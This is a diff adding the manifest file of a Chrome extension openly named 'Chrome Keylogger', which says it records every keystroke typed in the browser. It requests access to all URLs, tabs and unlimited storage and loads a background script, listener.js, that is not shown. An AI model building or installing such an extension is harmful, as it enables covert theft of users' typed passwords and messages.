@@ -1,0 +1,23 @@
+{
+  "manifest_version": 2,
+
+  "name": "Chrome Keylogger",
+  "description": "This extension records all keystrokes typed into the Chrome browser.",
+  "version": "1.0",
+
+  "browser_action": {
+    "default_icon": "icon.png",
+    "default_popup": "popup.html"
+  },
+
+  "background": {
+    "scripts": ["listener.js"]
+  },
+
+  "permissions": [
+    "<all_urls>",
+    "tabs",
+    "storage",
+    "unlimitedStorage"
+  ]
+}
